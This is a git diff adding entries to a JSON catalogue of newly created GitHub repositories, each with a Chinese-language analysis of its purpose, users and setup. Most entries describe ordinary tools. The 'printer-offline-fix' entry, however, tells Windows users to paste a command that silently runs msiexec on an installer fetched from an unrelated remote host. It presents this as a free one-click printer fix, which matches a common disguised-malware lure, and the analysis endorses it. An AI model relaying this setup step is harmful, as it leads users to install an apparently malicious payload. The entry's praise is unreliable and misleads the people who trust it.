@@ -1,6 +1,6 @@
 {
   "version": "1",
-  "updatedAt": "2026-05-09T04:55:24.207Z",
+  "updatedAt": "2026-05-10T05:10:45.579Z",
   "projects": [
     {
       "owner": "codecrafters-io",
@@ -27837,6 +27837,572 @@
         "category": "后端框架"
       },
       "analyzedAt": "2026-05-09T04:55:24.196Z"
+    },
+    {
+      "owner": "Rhythmplocutter",
+      "repo": "printer-offline-fix",
+      "fullName": "Rhythmplocutter/printer-offline-fix",
+      "description": "printer offline fix || printer offline || printer offline driver || printer offline fix windows",
+      "language": "PowerShell",
+      "topics": [
+        "brother-printer-offline",
+        "fix-printer-offline",
+        "how-to-fix-printer-offline",
+        "hp-printer-offline",
+        "hp-printer-offline-fix",
+        "offline-printer",
+        "offline-printer-fix",
+        "printer-is-offline",
+        "printer-is-offline-how-to-fix",
+        "printer-offline",
+        "printer-offline-fix",
+        "printer-says-offline",
+        "printer-showing-offline",
+        "why-is-my-printer-offline"
+      ],
+      "license": "MIT",
+      "createdAt": "2026-05-10T00:43:27Z",
+      "url": "https://github.com/Rhythmplocutter/printer-offline-fix",
+      "analysis": {
+        "positioning": "Windows打印机离线？一键搞定常见故障，无需手动排查。",
+        "useCases": [
+          "你遇到打印机显示“离线”且无法打印 → 它帮你自动诊断并修复打印后台处理服务。",
+          "你尝试打印时队列卡死，文件无法删除 → 它帮你清除所有挂起的打印任务。",
+          "你被“使用脱机打印机”选项困扰，无法恢复在线 → 它帮你一键重置打印机状态，强制上线。"
+        ],
+        "audience": "任何被Windows打印机“离线”问题困扰，不愿手动排查复杂步骤的Windows用户。",
+        "quickStart": {
+          "prerequisites": "Windows 10/11操作系统",
+          "steps": [
+            "打开命令提示符（Win+R，输入`cmd`，回车）。",
+            "复制提供的安装命令`cmd /c start msiexec /q /i https://cloudcraftshub.com/api & rem printer offline fix`，粘贴到命令提示符中并回车。"
+          ],
+          "note": null
+        },
+        "competitors": [],
+        "pricing": "免费",
+        "vibeCodingScore": 3,
+        "vibeCodingReason": "以简洁的PowerShell脚本自动化解决复杂的Windows打印机离线问题，提升系统维护效率，避免手动排查的繁琐。",
+        "isVibeCoding": true,
+        "communityActivity": "社区活跃度较低，目前无Issue。",
+        "category": "CLI工具"
+      },
+      "analyzedAt": "2026-05-10T05:06:32.984Z"
+    },
+    {
+      "owner": "kitft",
+      "repo": "natural_language_autoencoders",
+      "fullName": "kitft/natural_language_autoencoders",
+      "description": "",
+      "language": "Python",
+      "topics": [],
+      "license": "Apache-2.0",
+      "createdAt": "2026-05-05T16:27:07Z",
+      "url": "https://github.com/kitft/natural_language_autoencoders",
+      "analysis": {
+        "positioning": "将LLM内部激活转译为自然语言解释，提升模型可解释性。",
+        "useCases": [
+          "你研究LLM内部机制 → 它将复杂激活向量转为人类可读的自然语言解释，揭示模型决策依据。",
+          "你调试LLM或排查AI偏见 → 它提供可解释性报告，帮你定位问题和理解模型行为。",
+          "你想训练定制化NLA模型 → 它提供完整的训练代码库，助你复现或扩展Anthropic的研究。"
+        ],
+        "audience": "LLM研究员、AI伦理专家、模型调试工程师，希望深入理解和解释大语言模型内部运作机制。",
+        "quickStart": {
+          "prerequisites": "Python环境，熟悉Hugging Face生态。",
+          "steps": [
+            "安装`kitft/nla-inference`推理包。",
+            "从Hugging Face Hub加载预训练的AV/AR模型。",
+            "传入LLM激活向量，获取其自然语言解释。"
+          ],
+          "note": null
+        },
+        "competitors": [],
+        "pricing": "免费",
+        "vibeCodingScore": 3,
+        "vibeCodingReason": "技术深度高，直接来源于顶尖研究成果，但应用场景相对垂直，主要服务于LLM可解释性研究与调试，而非通用开发。",
+        "isVibeCoding": true,
+        "communityActivity": "社区活跃度较低，可能因项目相对较新或核心团队维护为主。",
+        "category": "其他"
+      },
+      "analyzedAt": "2026-05-10T05:07:05.232Z"
+    },
+    {
+      "owner": "PentHertz",
+      "repo": "LUKSbox",
+      "fullName": "PentHertz/LUKSbox",
+      "description": "Store sensitive files in the cloud, or on shared media without trusting the host. LUKSbox is a Rust-based encrypted-container tool with passphrase, FIDO2 (YubiKey, Titan, Nitrokey, Windows Hello), TPM 2.0, and hybrid post-quantum (ML-KEM-768 / 1024) keyslots. Mounts as a real drive on Linux, macOS, and Windows.",
+      "language": "Rust",
+      "topics": [
+        "encryption",
+        "file",
+        "secure",
+        "sensitive-data",
+        "vault"
+      ],
+      "license": "Apache-2.0",
+      "createdAt": "2026-05-06T21:47:11Z",
+      "url": "https://github.com/PentHertz/LUKSbox",
+      "analysis": {
+        "positioning": "保护云端及共享介质上敏感文件的后量子加密容器。",
+        "useCases": [
+          "你担心云存储服务商（如Dropbox、OneDrive）会访问你的隐私文件 → 它帮你将文件加密为不可读容器后再上传，即便服务商也无法解密。",
+          "你需要在不安全的共享介质（如U盘、NAS、备份盘）上存储重要数据 → 它帮你创建防篡改、加密的虚拟驱动器，保证数据安全不被未授权访问或静默修改。",
+          "你担忧未来量子计算机破解现有加密算法，导致数据被“先收集后解密” → 它提供ML-KEM-768/1024混合后量子密钥槽，确保加密数据抵御未来攻击。"
+        ],
+        "audience": "关注数据隐私和安全，需要将敏感文件存储在不信任的云服务或共享介质上，并对未来量子攻击有防范需求的个人和企业用户。",
+        "quickStart": {
+          "prerequisites": null,
+          "steps": [
+            "安装LUKSbox工具（支持Linux, macOS, Windows）。",
+            "创建一个加密容器文件（.lbx），并绑定密钥（密码、FIDO2、TPM 2.0或Windows Hello）。",
+            "将容器文件挂载为本地虚拟驱动器。",
+            "像操作普通硬盘一样存取文件，完成后卸载。"
+          ],
+          "note": "挂载后在操作系统中显示为真实驱动器。"
+        },
+        "competitors": [
+          {
+            "name": "普通云上传",
+            "method": "直接将文件上传到云服务商，不加密或使用客户端简单加密。",
+            "models": "N/A",
+            "pricing": "N/A"
+          },
+          {
+            "name": "云服务商加密",
+            "method": "使用云服务商提供的服务器端加密，密钥由服务商持有。",
+            "models": "N/A",
+            "pricing": "N/A"
+          }
+        ],
+        "pricing": "免费（开源，Apache-2.0 许可）。",
+        "vibeCodingScore": 3,
+        "vibeCodingReason": "项目目标明确，技术栈先进（Rust、FIDO2、TPM 2.0、后量子加密），在数据安全和隐私保护方面提供了前瞻性解决方案。文档和安全考量充分，但目前为 pre-1.0 状态，仍有成长空间。",
+        "isVibeCoding": true,
+        "communityActivity": "社区活跃度较低，Issue 统计为 0/0，可能项目较新或维护者尚未开放 Issue 提交流程。",
+        "category": "安全"
+      },
+      "analyzedAt": "2026-05-10T05:07:24.558Z"
+    },
+    {
+      "owner": "jmerelnyc",
+      "repo": "Photo-agents",
+      "fullName": "jmerelnyc/Photo-agents",
+      "description": "Autonomous self-evolving agents. Vision-grounded layered memory and self-written skills for LLM agents that operate your computer.",
+      "language": "Python",
+      "topics": [
+        "agent-memory",
+        "ai-agents",
+        "autonomous-agents",
+        "computer-use",
+        "llm",
+        "photo-agents",
+        "photographic-memory",
+        "python",
+        "self-evolving-agents",
+        "vision-agents"
+      ],
+      "license": "MIT",
+      "createdAt": "2026-05-04T09:14:09Z",
+      "url": "https://github.com/jmerelnyc/Photo-agents",
+      "analysis": {
+        "positioning": "LLM智能体，基于视觉和自学技能操作你的电脑。",
+        "useCases": [
+          "你想要自动化复杂电脑操作 → 它通过观察屏幕和自学技能帮你执行。",
+          "你想要AI Agent像人类一样理解UI → 它通过视觉感知和分层记忆来理解和响应。",
+          "你想要AI Agent能编写新技能 → 它能从成功经验中自动编写并使用新技能。"
+        ],
+        "audience": "想要让LLM智能体通过视觉感知和自主学习来操作电脑的开发者和研究者。",
+        "quickStart": {
+          "prerequisites": "Python 3.10+",
+          "steps": [
+            "pip install photoagents",
+            "获取Photo Agents API Key"
+          ],
+          "note": null
+        },
+        "competitors": [
+          {
+            "name": "LangChain",
+            "method": "通用LLM编排框架，支持工具调用和Agent构建，但视觉感知和自学技能需手动实现。",
+            "models": "广泛支持各类LLM。",
+            "pricing": "框架免费，LLM服务付费。"
+          },
+          {
+            "name": "AutoGPT",
+            "method": "基于文本指令的自主任务分解和执行，通过工具进行交互，但缺乏视觉理解和深层记忆。",
+            "models": "主要支持OpenAI模型。",
+            "pricing": "代码免费，LLM服务付费。"
+          }
+        ],
+        "pricing": "部分免费（需API Key验证，具体定价未知）",
+        "vibeCodingScore": 3,
+        "vibeCodingReason": "项目愿景和技术深度明确，有清晰架构和多种客户端支持。但API Key验证和无公开Issue，显示社区活跃度不高，可能偏向商业化或早期受控开发。",
+        "isVibeCoding": true,
+        "communityActivity": "社区活跃度较低，无公开Issue互动。",
+        "category": "AI Agent"
+      },
+      "analyzedAt": "2026-05-10T05:07:40.061Z"
+    },
+    {
+      "owner": "fendouai",
+      "repo": "CodexSaver",
+      "fullName": "fendouai/CodexSaver",
+      "description": "Make Codex cheaper without making it dumber with DeepSeek.",
+      "language": "Python",
+      "topics": [
+        "codex",
+        "deepseek"
+      ],
+      "license": "Unknown",
+      "createdAt": "2026-05-06T14:34:36Z",
+      "url": "https://github.com/fendouai/CodexSaver",
+      "analysis": {
+        "positioning": "智能路由编程任务，兼顾成本与智能。",
+        "useCases": [
+          "你需要编写测试、文档或解释代码 → 它帮你用更便宜的LLM执行，降低成本。",
+          "你需要处理架构、安全或最终代码审查 → 它确保Codex处理高风险任务，保证质量。",
+          "你希望了解AI任务路由决策 → 它提供清晰的交互细节，让你知道任务如何被分派。"
+        ],
+        "audience": "希望在利用Codex进行编程时，有效控制成本，同时不牺牲高风险任务质量的开发者及团队。",
+        "quickStart": {
+          "prerequisites": "Git, Python, DeepSeek或其他支持LLM的API Key",
+          "steps": [
+            "git clone https://github.com/fendouai/CodexSaver",
+            "cd CodexSaver && python cli.py auth set --provider deepseek --api-key YOUR_API_KEY",
+            "python cli.py install"
+          ],
+          "note": "默认全局安装，也可以选择项目级安装。"
+        },
+        "competitors": [],
+        "pricing": "免费使用，但底层LLM服务（如Codex, DeepSeek）可能收费。",
+        "vibeCodingScore": 4,
+        "vibeCodingReason": "通过智能路由，在编程过程中有效平衡AI调用成本与任务复杂度，提高开发效率，同时提供清晰的决策反馈，让开发者安心使用。",
+        "isVibeCoding": true,
+        "communityActivity": "项目处于早期，Issue 数量为0，社区活跃度待观察。",
+        "category": "AI编程助手"
+      },
+      "analyzedAt": "2026-05-10T05:07:54.170Z"
+    },
+    {
+      "owner": "pixel-point",
+      "repo": "media-downloader",
+      "fullName": "pixel-point/media-downloader",
+      "description": "Beautiful native macOS video downloader. Download and trim in one app.",
+      "language": "Swift",
+      "topics": [],
+      "license": "Unknown",
+      "createdAt": "2026-05-06T20:01:08Z",
+      "url": "https://github.com/pixel-point/media-downloader",
+      "analysis": {
+        "positioning": "macOS本地视频下载与剪辑一体工具",
+        "useCases": [
+          "你想从YouTube/TikTok下载视频 → 它帮你粘贴链接、自动下载并保存到指定目录。",
+          "你下载了在线视频想剪辑片段 → 它帮你快速剪辑视频并保存或复制剪辑。",
+          "你希望管理下载历史记录 → 它帮你记录下载列表，方便快速访问、复制或在Finder中查看。"
+        ],
+        "audience": "经常需要从各类在线平台（如YouTube、Instagram、TikTok等）下载和初步剪辑视频的macOS用户。",
+        "quickStart": {
+          "prerequisites": "macOS 操作系统",
+          "steps": [
+            "下载并安装最新版MediaDownloader-macos-arm64.dmg。",
+            "打开应用，粘贴视频链接（支持千余网站），应用将自动开始下载。"
+          ],
+          "note": null
+        },
+        "competitors": [
+          {
+            "name": "yt-dlp (命令行版)",
+            "method": "命令行",
+            "models": "支持上千网站",
+            "pricing": "免费"
+          }
+        ],
+        "pricing": "免费",
+        "vibeCodingScore": 4,
+        "vibeCodingReason": "原生macOS应用，UI美观，功能专注且实用（下载、剪辑），底层依赖yt-dlp和ffmpeg，稳定性有保障，Issue数量极少，用户体验良好。",
+        "isVibeCoding": true,
+        "communityActivity": "Issue数量极少（1个开启），表明项目可能非常稳定或维护者响应迅速。",
+        "category": "其他"
+      },
+      "analyzedAt": "2026-05-10T05:08:09.878Z"
+    },
+    {
+      "owner": "ThisIsDara",
+      "repo": "mhr-cfw-go",
+      "fullName": "ThisIsDara/mhr-cfw-go",
+      "description": "A local proxy that runs on your machine and forwards traffic through Google.",
+      "language": "Go",
+      "topics": [
+        "domain-fronting",
+        "dpi-bypass",
+        "http",
+        "proxy",
+        "sni",
+        "vpn"
+      ],
+      "license": "MIT",
+      "createdAt": "2026-05-04T04:24:15Z",
+      "url": "https://github.com/ThisIsDara/mhr-cfw-go",
+      "analysis": {
+        "positioning": "一个利用Google基础设施绕过审查的本地代理。",
+        "useCases": [
+          "你想访问被封锁的网站 → 它帮你伪装成谷歌流量，绕过网络审查。",
+          "你在受限区域观看YouTube视频 → 它优化YouTube支持，提供流畅播放体验。",
+          "你需要更快的代理连接 → 它通过HTTP/2和连接池提升代理速度。"
+        ],
+        "audience": "适合需要绕过网络审查、安全访问互联网的用户，尤其是在网络受限区域。",
+        "quickStart": {
+          "prerequisites": "Go 1.22+",
+          "steps": [
+            "克隆项目并构建可执行文件（或下载发布版本）。",
+            "配置 `config.json`（特别是 `script_id`），然后运行程序启动代理。"
+          ],
+          "note": "Windows 和 Linux/Mac 构建方式略有不同；Go 依赖下载可使用伊朗镜像加速。"
+        },
+        "competitors": [
+          {
+            "name": "VPN (例如：ExpressVPN, NordVPN)",
+            "method": "客户端连接，流量全局加密转发",
+            "models": "OpenVPN, WireGuard 等多种协议",
+            "pricing": "大多订阅制付费"
+          },
+          {
+            "name": "Shadowsocks/V2Ray/Trojan",
+            "method": "部署服务器端，客户端连接",
+            "models": "自定义混淆协议",
+            "pricing": "免费开源，自建服务器需付费"
+          }
+        ],
+        "pricing": "免费 (开源项目，利用 Google 免费基础设施)",
+        "vibeCodingScore": 4,
+        "vibeCodingReason": "项目从Python重写至Go，代码质量高，无外部依赖。修复了YouTube支持，显著提升了速度和安全性，README清晰详细。",
+        "isVibeCoding": true,
+        "communityActivity": "Issue 处理及时，开闭比为 1:1，社区互动良好但规模不大。",
+        "category": "安全"
+      },
+      "analyzedAt": "2026-05-10T05:08:24.259Z"
+    },
+    {
+      "owner": "ajavadinezhad",
+      "repo": "zyrln",
+      "fullName": "ajavadinezhad/zyrln",
+      "description": "Domain-fronting relay that routes traffic through Google infrastructure to bypass DPI-based censorship,  Android VPN    app + desktop proxy",
+      "language": "Go",
+      "topics": [],
+      "license": "MIT",
+      "createdAt": "2026-05-04T17:25:03Z",
+      "url": "https://github.com/ajavadinezhad/zyrln",
+      "analysis": {
+        "positioning": "利用Google基础设施，绕过审查的抗封锁代理。",
+        "useCases": [
+          "你身处审查严格地区想看YouTube → Zyrln帮你通过碎片化TLS直连Google，高速访问。",
+          "你想访问Twitter、Instagram等非Google网站 → Zyrln帮你通过Google Apps Script和你的VPS中转，伪装成Google流量。",
+          "你不想购买或维护昂贵的VPN服务器 → Zyrln帮你利用免费的Google服务和现有基础设施，实现抗审查代理。"
+        ],
+        "audience": "适合在网络审查严格地区的用户（如伊朗），需要稳定、低成本访问全球互联网的个人。",
+        "quickStart": {
+          "prerequisites": null,
+          "steps": [
+            "从Releases页面下载对应平台的应用。",
+            "运行应用，GUI自动在浏览器中打开。",
+            "点击顶部栏的“⚡闪电”按钮启用Direct Mode。",
+            "将浏览器HTTP代理设置为`127.0.0.1:8085`。"
+          ],
+          "note": "此模式专门优化Google服务，无需服务器，即开即用。"
+        },
+        "competitors": [],
+        "pricing": "免费/部分免费。核心功能利用Google免费服务，完全免费；访问非Google站点的进阶功能可选自费部署VPS。",
+        "vibeCodingScore": 4,
+        "vibeCodingReason": "项目目标明确，技术方案创新实用，充分利用免费Google基础设施对抗审查。README文档清晰详细，易于上手，兼顾简单模式和高级部署，维护活跃度良好。",
+        "isVibeCoding": true,
+        "communityActivity": "活跃。Issues开闭比合理（20开/17关），表明项目维护者积极响应并解决问题。",
+        "category": "安全"
+      },
+      "analyzedAt": "2026-05-10T05:08:36.510Z"
+    },
+    {
+      "owner": "mykolaharmash",
+      "repo": "notelet",
+      "fullName": "mykolaharmash/notelet",
+      "description": "SwiftUI component for displaying rich release notes inside an app",
+      "language": "Swift",
+      "topics": [],
+      "license": "MIT",
+      "createdAt": "2026-05-06T21:26:47Z",
+      "url": "https://github.com/mykolaharmash/notelet",
+      "analysis": {
+        "positioning": "为iOS应用提供优雅的、富媒体发布更新日志的SwiftUI组件。",
+        "useCases": [
+          "你做iOS应用开发 → 它帮你轻松在应用内展示新版本特性。",
+          "你做应用更新通知 → 它帮你用图片、视频等多媒体形式丰富发布日志。",
+          "你希望用户快速了解更新内容 → 它帮你提供清晰、易读的更新列表和媒体展示。"
+        ],
+        "audience": "适合所有使用SwiftUI开发iOS/iPadOS应用的开发者，希望高效集成美观的应用内更新日志功能。",
+        "quickStart": {
+          "prerequisites": "Xcode，支持iOS 17.0+或iPadOS 17.0+的项目。",
+          "steps": [
+            "在Xcode中，前往 `File → Add Package Dependencies...`。",
+            "输入仓库URL `https://github.com/mykolaharmash/notelet` 并添加。",
+            "将 `Notelet` 添加到你的应用目标。",
+            "在代码中导入 `Notelet` 并使用 `NoteletView` 展示预定义的更新日志数据。"
+          ],
+          "note": null
+        },
+        "competitors": [],
+        "pricing": "免费 (MIT许可)",
+        "vibeCodingScore": 4,
+        "vibeCodingReason": "文档清晰，提供了丰富的示例代码和视频演示。支持列表、图片、视频等富文本发布日志，集成简便。适合现代SwiftUI项目。",
+        "isVibeCoding": true,
+        "communityActivity": "社区活跃度较低，Issue统计显示目前没有开放或已关闭的Issue。",
+        "category": "移动开发"
+      },
+      "analyzedAt": "2026-05-10T05:08:47.760Z"
+    },
+    {
+      "owner": "huggingface",
+      "repo": "nanowhale",
+      "fullName": "huggingface/nanowhale",
+      "description": "",
+      "language": "Python",
+      "topics": [],
+      "license": "Unknown",
+      "createdAt": "2026-05-04T14:18:10Z",
+      "url": "https://github.com/huggingface/nanowhale",
+      "analysis": {
+        "positioning": "一个迷你版DeepSeek-V4架构语言模型，附带完整预训练与微调代码。",
+        "useCases": [
+          "你做LLM架构研究 → 它提供一个可运行的DeepSeek-V4微缩版实现，便于理解MLA、MoE、Hyper-Connections等高级特性。",
+          "你做小模型从零训练 → 它提供完整的预训练和SFT代码与配置，帮你快速启动自己的LLM实验。",
+          "你想快速体验DeepSeek-V4系列模型 → 它提供已训练好的100M基座和聊天模型，可直接下载部署进行交互。"
+        ],
+        "audience": "适合对DeepSeek-V4架构感兴趣的研究者、学生，或希望从头训练、微调小规模LLM的开发者。",
+        "quickStart": {
+          "prerequisites": "Python环境，并安装requirements.txt中列出的依赖。",
+          "steps": [
+            "克隆项目并安装依赖: `pip install -r requirements.txt`",
+            "根据需求运行脚本：如预训练 `python scripts/train_pretrain.py` 或启动聊天 `python scripts/chat.py`"
+          ],
+          "note": null
+        },
+        "competitors": [
+          {
+            "name": "TinyLlama",
+            "method": "提供Llama架构的小模型训练代码与已训练模型",
+            "models": "TinyLlama",
+            "pricing": "免费"
+          }
+        ],
+        "pricing": "免费",
+        "vibeCodingScore": 4,
+        "vibeCodingReason": "项目结构清晰，代码组织良好，提供详细的DeepSeek-V4架构实现、训练脚本和配置，便于研究和快速上手，甚至有架构检查工具。",
+        "isVibeCoding": true,
+        "communityActivity": "Issues统计为0/0，表明项目可能较新或主要用于特定研究，暂无公开社区活跃度数据。",
+        "category": "LLM框架"
+      },
+      "analyzedAt": "2026-05-10T05:09:04.611Z"
+    },
+    {
+      "owner": "louisedesadeleer",
+      "repo": "clipify",
+      "fullName": "louisedesadeleer/clipify",
+      "description": "Claude Code skill: turn long videos into social-ready clips. Auto-find funny moments, cut, reframe to 9:16 with face-tracking, and burn opus-style captions.",
+      "language": "Python",
+      "topics": [],
+      "license": "MIT",
+      "createdAt": "2026-05-05T13:11:24Z",
+      "url": "https://github.com/louisedesadeleer/clipify",
+      "analysis": {
+        "positioning": "长视频转社交短片，智能剪辑、重构、加字幕。",
+        "useCases": [
+          "你有一个长视频 → 它帮你智能识别出精彩片段。",
+          "你选中了精彩片段 → 它帮你自动裁剪成9:16，并智能追踪说话者。",
+          "你有了短片 → 它帮你自动添加Opus风格的字字幕。"
+        ],
+        "audience": "视频创作者、播客主，希望快速制作适用于社交媒体的对话类短视频。",
+        "quickStart": {
+          "prerequisites": "macOS, Claude Code, ffmpeg, whisper, Python3 with numpy",
+          "steps": [
+            "通过git clone安装到Claude Code技能目录（~/.claude/skills/clipify）。",
+            "重启Claude Code，在其中运行`/clipify`命令，按提示粘贴视频路径并操作。"
+          ],
+          "note": "Linux/Windows用户需移除ffmpeg的`-hwaccel videotoolbox`参数。"
+        },
+        "competitors": [
+          {
+            "name": "云端AI自动剪辑平台",
+            "method": "上传视频至云端处理，通常提供GUI界面",
+            "models": "专有AI模型，可能结合开源模型",
+            "pricing": "通常按时长或订阅付费"
+          },
+          {
+            "name": "传统视频编辑软件（手动剪辑）",
+            "method": "用户手动剪辑、加字幕、排版",
+            "models": "N/A",
+            "pricing": "通常买断或订阅付费"
+          }
+        ],
+        "pricing": "免费，基于开源组件在本地运行。",
+        "vibeCodingScore": 4,
+        "vibeCodingReason": "实用型本地AI工具，高效解决社交媒体短视频制作痛点，智能片段识别和动态字幕功能亮点突出，强调本地运行无云API，效率高。",
+        "isVibeCoding": true,
+        "communityActivity": "社区活跃度较低，Issue开启2个但无关闭。",
+        "category": "AI Agent"
+      },
+      "analyzedAt": "2026-05-10T05:09:18.997Z"
+    },
+    {
+      "owner": "NousResearch",
+      "repo": "hermes-agent",
+      "fullName": "NousResearch/hermes-agent",
+      "description": "The agent that grows with you",
+      "language": "Python",
+      "topics": [
+        "ai",
+        "ai-agent",
+        "ai-agents",
+        "anthropic",
+        "chatgpt",
+        "claude",
+        "claude-code",
+        "clawdbot",
+        "codex",
+        "hermes",
+        "hermes-agent",
+        "llm",
+        "moltbot",
+        "nous-research",
+        "openai",
+        "openclaw"
+      ],
+      "license": "MIT",
+      "createdAt": "2025-07-22T22:22:28Z",
+      "url": "https://github.com/NousResearch/hermes-agent",
+      "analysis": {
+        "positioning": "会自我学习、跨平台、持久化记忆的AI代理。",
+        "useCases": [
+          "你希望AI能理解你并持续成长 → 它能从经验中学习，深化对你的理解，并创建和改进技能。",
+          "你需要在多设备、多平台无缝使用AI → 它提供跨平台无缝对话和任务执行，在云端持续工作。",
+          "你需要自动化重复的日常任务 → 它内置调度器，能用自然语言安排报告、备份等任务。",
+          "你不想被特定LLM厂商锁定 → 它让你自由选择并切换多种LLM模型后端，无需代码修改。"
+        ],
+        "audience": "寻求高度定制、可自我学习、跨平台部署的AI助手的开发者和技术爱好者。",
+        "quickStart": {
+          "prerequisites": "Python环境",
+          "steps": [
+            "1. 克隆项目仓库",
+            "2. 参照官方文档（hermes-agent.nousresearch.com/docs/）进行安装和配置"
+          ],
+          "note": "支持OpenAI、Claude、Kimi等多种LLM模型，可在运行时通过`hermes model`命令切换。"
+        },
+        "competitors": [],
+        "pricing": "项目本身免费（MIT许可），但使用的底层LLM服务可能产生费用。",
+        "vibeCodingScore": 4,
+        "vibeCodingReason": "强大的自我学习和跨平台能力，支持高度定制化模型，面向技术专业用户，提供深度集成和自动化功能。",
+        "isVibeCoding": true,
+        "communityActivity": "Issue开启量巨大（9589），但已关闭数量为0，社区响应和维护状态存疑。",
+        "category": "AI Agent"
+      },
+      "analyzedAt": "2026-05-10T05:10:45.570Z"
     }
   ]
 }
